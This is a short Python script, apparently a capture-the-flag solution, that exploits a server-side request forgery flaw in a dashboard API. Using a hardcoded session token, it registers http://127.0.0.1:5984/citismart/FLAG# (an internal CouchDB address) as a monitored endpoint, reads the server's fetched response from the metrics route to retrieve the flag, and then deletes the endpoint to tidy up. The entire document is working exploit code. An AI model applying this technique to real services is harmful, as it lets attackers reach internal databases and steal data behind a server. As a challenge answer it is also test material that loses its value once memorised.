from requests import get, post, delete
import json
from urllib.parse import quote_plus

HOST = "http://94.237.49.23:36702"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6ZmFsc2UsImFkbWluIjpmYWxzZSwiaWF0IjoxNzU5NDk3NzQ0LCJleHAiOjE3NTk1MDEzNDR9.37xaz2UDP6-m-sJc8L-syYEaHYssXsK-Dg0_50GJxx0"

def setEndpoint(token, endpoint):
    r = post(HOST + "/api/dashboard/endpoints", cookies={"token": token}, json={"url": endpoint, "sector": "test"})
    
    return r.status_code == 200

def deleteEndpoint(token, endpoint):
    r = delete(HOST + "/api/dashboard/endpoints/" + endpoint, cookies={"token": token})


def getResponse(token):
    r = get(HOST + "/api/dashboard/metrics", cookies={"token": token})
    data = json.loads(r.text)

    return data['data']['test']
    

url = "citismart/FLAG"
endpoint = f"http://127.0.0.1:5984/{url}#"
if setEndpoint(token, endpoint):
    print(getResponse(token))
    deleteEndpoint(token, quote_plus(endpoint))
else:
    print("Failed to set endpoint")